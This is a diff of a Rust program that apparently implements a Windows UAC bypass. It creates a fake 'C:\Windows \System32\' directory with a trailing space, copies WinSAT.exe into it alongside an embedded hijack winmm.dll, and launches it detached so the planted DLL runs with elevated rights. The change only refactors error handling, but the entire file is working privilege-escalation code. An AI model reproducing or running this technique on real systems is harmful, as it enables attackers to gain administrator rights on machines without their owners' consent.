@@ -1,12 +1,11 @@
-use std::{fs, os::windows::process::CommandExt, process::Command};
+use std::{fs, io::Error, os::windows::process::CommandExt, process::Command};
 
 static WINMM_DLL: &[u8] = std::include_bytes!(concat!(env!("OUT_DIR"), "/winmm.dll"));
 
-pub fn main() {
+pub fn main() -> Result<(), Error> {
     println!(r"[+] Creating fake directory C:\Windows \System32\...");
     fs::create_dir_all(r"C:\Windows \")
-        .and_then(|_| fs::create_dir_all(r"C:\Windows \System32\"))
-        .unwrap();
+        .and_then(|_| fs::create_dir_all(r"C:\Windows \System32\"))?;
 
     println!(r"[+] Copying C:\Windows\System32\WinSAT.exe to C:\Windows \System32\WinSAT.exe...");
     fs::copy(
@@ -26,6 +25,7 @@ pub fn main() {
     Command::new("cmd.exe")
         .args(["/C", r"C:\Windows \System32\WinSAT.exe"])
         .creation_flags(0x00000008)
-        .spawn()
-        .unwrap();
+        .spawn()?;
+
+    Ok(())
 }
